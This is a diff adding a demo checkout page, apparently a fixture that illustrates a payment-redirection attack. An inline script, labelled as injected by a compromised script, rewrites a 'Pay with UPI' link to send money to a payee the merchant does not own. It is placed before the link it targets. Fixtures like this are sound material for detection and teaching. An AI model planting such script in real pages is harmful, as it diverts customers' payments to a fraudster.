@@ -1,0 +1,14 @@
+<!doctype html>
+<html><head><title>Checkout | Croma (demo)</title></head>
+<body>
+  <h1>Checkout</h1>
+  <form id="payment-form" action="/v1/checkout/pay" method="post">
+    <input name="cc-number" autocomplete="cc-number">
+    <button type="submit">Pay</button>
+  </form>
+  <!-- Injected by a compromised script: a UPI deep link to a payee the merchant does not own -->
+  <script>
+    document.getElementById("upi").href = "upi://pay?pa=refund.desk@okbank&am=76499";
+  </script>
+  <a id="upi" href="#">Pay with UPI</a>
+</body></html>
